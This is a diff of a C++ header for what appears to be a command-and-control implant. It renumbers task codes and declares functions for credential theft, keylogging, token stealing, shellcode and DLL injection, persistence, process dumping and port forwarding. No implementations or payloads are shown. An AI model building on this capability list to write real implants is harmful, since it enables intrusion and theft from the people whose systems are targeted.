@@ -39,48 +39,52 @@
 #define IDI_GDICAPTURINGANIMAGE 2
 #define IDI_SMALL 3
 
-#define TASK_CAT                0x01
-#define TASK_CD                 0x02
-#define TASK_CONNECT            0x03
-#define TASK_CP                 0x04
-#define TASK_CREDS_STEAL        0x05
-#define TASK_DLL                0x06
-#define TASK_DOWNLOAD           0x07
-#define TASK_ENV_LS             0x08
-#define TASK_EXECUTE            0x09
-#define TASK_GROUP_LS           0x10
-#define TASK_HISTORY            0x11
-#define TASK_IP                 0x12
-#define TASK_JITTER             0x13
-#define TASK_KEYLOG             0x14
-#define TASK_KILL               0x15
-#define TASK_KILLDATE           0x16
-#define TASK_LS                 0x17
-#define TASK_MIGRATE            0x18
-#define TASK_MKDIR              0x19
-#define TASK_MV                 0x20
-#define TASK_NET                0x21
-#define TASK_PERSIST            0x22
-#define TASK_PROCDUMP           0x23
-#define TASK_PS_KILL            0x24
-#define TASK_PS_LS              0x25
-#define TASK_PWD                0x26
-#define TASK_REG_QUERY          0x27
-#define TASK_RM                 0x28
-#define TASK_RMDIR              0x29
-#define TASK_RPORTFWD_ADD       0x30
-#define TASK_RPORTFWD_LS        0x31
-#define TASK_RPORTFWD_RM        0x32
-#define TASK_RUNAS              0x33
-#define TASK_SCREENSHOT         0x34
-#define TASK_SHELLCODE          0x35
-#define TASK_SLEEP              0x36
-#define TASK_TOKEN_REVERT       0x37
-#define TASK_TOKEN_STEAL        0x38
-#define TASK_UPLOAD             0x39
-#define TASK_USER_LS            0x40
-#define TASK_WHOAMI             0x41
-#define TASK_WHOAMI_PRIV        0x42
+// TASK CODE
+// *sync this with the code in 'pkg/server/task/task.go'
+#define TASK_ASSEMBLY           0x01
+#define TASK_CAT                0x02
+#define TASK_CD                 0x03
+#define TASK_CMD                0x04
+#define TASK_CONNECT            0x05
+#define TASK_CP                 0x06
+#define TASK_CREDS_STEAL        0x07
+#define TASK_DLL                0x08
+#define TASK_DOWNLOAD           0x09
+#define TASK_ENV_LS             0x10
+#define TASK_EXE                0x11
+#define TASK_GROUP_LS           0x12
+#define TASK_HISTORY            0x13
+#define TASK_IP                 0x14
+#define TASK_JITTER             0x15
+#define TASK_KEYLOG             0x16
+#define TASK_KILL               0x17
+#define TASK_KILLDATE           0x18
+#define TASK_LS                 0x19
+#define TASK_MIGRATE            0x20
+#define TASK_MKDIR              0x21
+#define TASK_MV                 0x22
+#define TASK_NET                0x23
+#define TASK_PERSIST            0x24
+#define TASK_PROCDUMP           0x25
+#define TASK_PS_KILL            0x26
+#define TASK_PS_LS              0x27
+#define TASK_PWD                0x28
+#define TASK_REG_QUERY          0x29
+#define TASK_RM                 0x30
+#define TASK_RMDIR              0x31
+#define TASK_RPORTFWD_ADD       0x32
+#define TASK_RPORTFWD_LS        0x33
+#define TASK_RPORTFWD_RM        0x34
+#define TASK_RUNAS              0x35
+#define TASK_SCREENSHOT         0x36
+#define TASK_SHELLCODE          0x37
+#define TASK_SLEEP              0x38
+#define TASK_TOKEN_REVERT       0x39
+#define TASK_TOKEN_STEAL        0x40
+#define TASK_UPLOAD             0x41
+#define TASK_USER_LS            0x42
+#define TASK_WHOAMI             0x43
+#define TASK_WHOAMI_PRIV        0x44
 
 namespace Task
 {
@@ -125,15 +129,17 @@ namespace Task
         BOOL CreateProcessWithStolenToken(Procs::PPROCS pProcs, HANDLE hToken, LPCWSTR appName);
     }
 
+    std::wstring Assembly(State::PSTATE pState, const std::wstring& wAssembly);
     std::wstring Cat(State::PSTATE pState, const std::wstring& wFilePath);
     std::wstring Cd(State::PSTATE pState, const std::wstring& wDestDir);
+    std::wstring Cmd(State::PSTATE pState, const std::wstring& wCmd);
     std::wstring Connect(State::PSTATE pState, const std::wstring& wListenerURL);
     std::wstring Cp(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring CredsSteal(State::PSTATE pState);
     std::wstring Dll(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc);
     std::wstring Download(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring EnvLs(State::PSTATE pState);
-    std::wstring Execute(State::PSTATE pState, const std::wstring& wCmd);
+    std::wstring Exe(State::PSTATE pState, const std::wstring& wExeSrc);
     std::wstring GroupLs();
     std::wstring History(State::PSTATE pState);
     std::wstring Ip();
